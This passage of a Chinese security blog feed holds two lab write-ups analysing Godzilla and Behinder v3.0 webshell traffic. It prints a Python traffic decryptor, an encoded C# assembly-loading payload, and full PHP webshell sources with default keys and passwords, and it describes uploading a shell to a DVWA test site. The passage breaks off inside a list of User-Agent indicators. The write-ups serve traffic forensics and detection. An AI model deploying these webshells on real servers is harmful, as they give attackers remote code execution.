kszXhSCMLQcwOSVWzgPoqCw+SN7qyvDOKfQze139czgBXTCQ+drybBDl6mm0APKAXZEmDIdAn15VOhhws/n5Wu6jHS5HULs4MQd5xIkBlO8y1jRuvLPUPlHz80kPgsucEEGLKN4QxROK8a8tlJP95G5rllEcdC4yCVCOXhRIvAOdZ1XlexOjXbhQVbkFxjME5aZL4duGEdXX7JjdDc1t0BWNtZt3fnlIunB/S0dJsyJ19BydgMRZJXlh+nEr0o/FakbVUZj8cv1nTsZeAbpIg/zIjJOfF2OHj2XdANY7ERvepV8fU5jt/m5WoqjTOmG5Z7X9oAXwL247h7YY0aAngKnnPBr0XLwcoWu5y+SKNPVgktdJldRyL90pC4d0nzLBmAqTlj9z98pOLzqLP5LrxTC67UomovQG1Aix4pPeaUmApyQ44O0EtcpyX+rhmmlCI+07ZDA2My2npBvjWk2Wcs2aeAxXtQiYSrvDKPXUddXg1OdT93xdeJzvorDdKdr2gGPia9TIr6U7qI8RyBbxPI0NXKoZU9ZdW1f5q/A/wuQfauwcoPYixhKYaW2NSbp/YR+sIODH4t0i80+tfjwKYZ30SU4RllmRwN4MR/CXpsi9YjWLazMkCJeJAVid9AqZPo2GNnxNkZFXiWtjvd4UrzkAlnFQwqhYBRkpg7ECT+Qyi0zwbPYr1MU4ZMvNBcC0U6pWshZ9fdWY5hCtkqVsw1ccn5SlytIyksf+BXeeQw9dpg45AHVQQ2rkp8uFkWF3Ero2QMIYLTZHSoKMxVvya7Z5ZyAs9qRDh/sKfTS1XYWExRx5LsFuoyua5QzGvEkXoTYlYMtnupE5gsqRTOXcFobXj5kjvOxvgWwqMecckvWqKzfk763xpt93Tm92SZJO0mqYnmAq6kd5OYkVE9vvMyiIES4ijW1GWkNkQjYaaafvnfNL2xJ2Uu/ZVHrqPafq79ILiyQCcExTq5Np1ent26WZ93kNqPJrv1n/9yDPmMjhRPyM4v6DS2DwWFdoWDYSE4UKjseK8kbeFzV3BFkT1V5hWwsaZ3kSo6CRCvC8RBE+yuoUlxn79zQYay7dRTp1dvIeLE3ZrIyZyuysRjffsyhxg1trh5myPFLMsSPnrmD/sVyF7EMHkfdxWTwN0R1YKxMw3JrfirXgCWTO2fJalWXgJWcravGrbhD0l5km3tf8L4Os/kiPxxvVyHmzv/GkySnWPgK1BUgnN4H1hqacotJk9j43GFn0sP+VnzuEpReiY0d0Xxr4qW/9Ys5bUO7YXWVqPvvwcCYD9doztghiBxebGTeURjsGtamY6HSr4kw8KvfpaoXnipuNJPCiNuHx/syzfNPuT6YtISJnHcl1D9au24eN9amzvsyStgBAq54SsVHXSNO5X+mppbcmsig0aJo6qlKSEYa5gdl8401BsuVy/Y/0tN5gFjWVjKo/l2fBe+C4+End+LQ1/ggBGaGATpPBRct2M/iDJ6OAubnQEGzslI8EmtWANjRpBlL50awQrxJaYVtVcw9ztDOe7thI7JVMtaOyg9RX6L7D3ZzpKzl+6+rmIMi9UMY6f5l8FlEpAWagf0A80lUB/2ZjZ34SOgwHsvPWir4XfjYk0ytaxw8RLBp5I0zuwknOy+y08afSh6NIROp6IyfvllEcDzsPWGCkPsjym6EEWM3SukK2QC7x2/nPekpLuE1J&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_EVAL_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(</span><br><span class=\"line\">    #     b&#x27;pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&amp;key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">    #     b&#x27;72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = CSHAP_ASMX_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asmx_req = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">    &lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class=\"line\">      &lt;soap:Body&gt;</span><br><span class=\"line\">        &lt;pass xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class=\"line\">          &lt;pass&gt;WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&lt;/pass&gt;</span><br><span class=\"line\">        &lt;/pass&gt;</span><br><span class=\"line\">      &lt;/soap:Body&gt;</span><br><span class=\"line\">    &lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    asmx_res = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(asmx_req)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(asmx_res)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    # decrypter = CSHAP_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # cshap_aes_raw_req=&#x27;5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68&#x27;</span><br><span class=\"line\">    # cshap_aes_raw_res = &#x27;09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br></pre></td></tr></table></figure>\n<p>找到如下模块并写入自己抓取流量包的数据（注意代码前方的缩进）<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YgxVz9UGNO1EI7iG.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TKeBzCkFRK0nZYVX.png!thumbnail\" alt=\"\"></p>\n<p>运行能够看到解密出来的代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E53uurH7zQWXkpa1.png!thumbnail\" alt=\"\"></p>\n<p>给它整理一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K) &#123;</span><br><span class=\"line\">\tfor ($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">\t\t$c = $K[$i+1&amp;15];</span><br><span class=\"line\">\t\t$D[$i] = $D[$i]^$c;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;key&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass])) &#123;</span><br><span class=\"line\">\t$data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">\tif (isset($_SESSION[$payloadName])) &#123;</span><br><span class=\"line\">\t\t$payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">\t\tif (strpos($payload,&quot;getBasicsInfo&quot;)===false) &#123;</span><br><span class=\"line\">\t\t\t$payload=encode($payload,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tteval($payload);</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">\t\techo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),16);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tif (strpos($data,&quot;getBasicsInfo&quot;)!==false) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到这便是 PHP 的加密脚本，把解密脚本中的 exit () 给注释掉，重新运行，能够看到终端返回的数据<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cDj4Klwx7PvggCh2.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在这里能够看到是我们输入了命令 ls 之后的回显，切换另一个流试试</p>\n<p>tcp 流 32：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wA5tuDksQN35qidX.png!thumbnail\" alt=\"\"></p>\n<p>将对应的数据填入脚本当中，运行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MS0bzMoV5f6yrg4E.png!thumbnail\" alt=\"\"></p>\n<p>能够看到回显出了根目录底下的文件，便是 ls / 命令的回显</p>\n<p>接下来将加密器切换成 PHP_XOR_BASE64 重新上传抓包</p>\n<p>先看看它生成的马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K)&#123;</span><br><span class=\"line\">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">        $c = $K[$i+1&amp;15];</span><br><span class=\"line\">        $D[$i] = $D[$i]^$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;pass&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass]))&#123;</span><br><span class=\"line\">    $data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class=\"line\">        $payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;</span><br><span class=\"line\">            $payload=encode($payload,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        eval($payload);</span><br><span class=\"line\">        echo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">        echo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">        echo substr(md5($pass.$key),16);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class=\"line\">            $_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再来看看流量包的追踪流<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/79qMzmBEXGPmxwbd.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>发现加密器不同，追踪流的数据也就自然不同，该加密器下请求体解密方法为先 base64 后解 xor，在解密脚本找到相对应的解密模块试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pO8s8NXrSMbCQSW1.png!thumbnail\" alt=\"\"></p>\n<p>也同样能够看到 ls / 命令之下的回显</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8w1r9fuqq7S2pF0S.png!thumbnail\" alt=\"\"></p>\n<p>切换下一个请求体与响应体对应解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wmj2C45JJcjWfYeC.png!thumbnail\" alt=\"\"></p>\n<p>能够看到 ls 命令的回显</p>\n<p>对比了 PHP_EVAL_XOR_BASE64 和 PHP_XOR_BASE64 之后能够发现，PHP_EVAL_XOR_BASE64 下的请求体与响应体基本是一个流对应一条命令，而 PHP_XOR_BASE64 可以是多条命令的请求体与响应体存在同一个流之中</p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "冰蝎v3.0流量浅析",
            "date_published": "2024-04-16T05:58:19.043Z",
            "content_html": "<p>近期稍微对冰蝎的流量进行了一些分析，因此来记录一下</p>\n<p>首先用的工具是冰蝎 3.0 版本的，它相对于 2.0 来说，做出了一些改动，个人认为比较大的一个特点就是取消了动态密钥的获取，也就是说如果只是在一个加密的命令执行的追踪流下，是无法获取到加密后的密钥的，这里在 NSSCTF 开了一个 DVWA 的环境来进行一个上传的 getshell 演示</p>\n<p>首先直接在上传口上传蚁剑 v3.0 的 shell.php，这里就用 php 来进行演示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4DCN2h1wG1fpqHRz.png!thumbnail\" alt=\"\"></p>\n<p>可以看到的是上传成功和路径，接下来进行冰蝎的连接</p>\n<p>首先点击新增</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOhbzvHyt49soKp2.png!thumbnail\" alt=\"\"></p>\n<p>在弹出来的页面编辑好 url 和密码</p>\n<p>这里先来看一下 shell.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class=\"line\">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class=\"line\">    $post=file_get_contents(&quot;php://input&quot;);</span><br><span class=\"line\">    if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class=\"line\">        $post=$t($post.&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class=\"line\">                 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class=\"line\">    $func=$arr[0];</span><br><span class=\"line\">    $params=$arr[1];</span><br><span class=\"line\">    class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(new C(),$params);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>能看到的是 e45e329feb5d925b 这一串 md5 的前 16 位，后面有注释显示的是密钥就是该 md5 为 rebeyond，那么就以这个作为连接密码进行冰蝎连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AzQcYoF255TLV9EC.png!thumbnail\" alt=\"\"></p>\n<p>保存之后双击添加的数据</p>\n<p>成功连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jiuskQYcIeZy6cqA.png!thumbnail\" alt=\"\"></p>\n<p>接下来使用 wireshark 进行抓包分析</p>\n<p>同样在捕获 -&gt; 选项设置好 WLAN 进行抓包</p>\n<p>接着在命令执行框中输入以下三条命令：</p>\n<ol>\n<li>\n<p>ls /</p>\n</li>\n<li>\n<p>ls /tmp</p>\n</li>\n<li>\n<p>ls /usr</p>\n</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItNIH1gcHM6NhruL.png!thumbnail\" alt=\"\"></p>\n<p>接着停止抓取流量进行分析</p>\n<p>首先先看到了 tcp 追踪流 23</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yLew2mlMcyrrEeO4.png!thumbnail\" alt=\"\"></p>\n<p>很明显的一个冰蝎流量加密，冰蝎的流量加密的最大一个特点就是先进行一次 base64 加密，再进行一次 AES 加密，至于冰蝎流量的特点：</p>\n<ol>\n<li>User-Agent</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 </span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class=\"line\">Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/144 255 173)&quot;&gt;11.50</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.0)</span><br><span 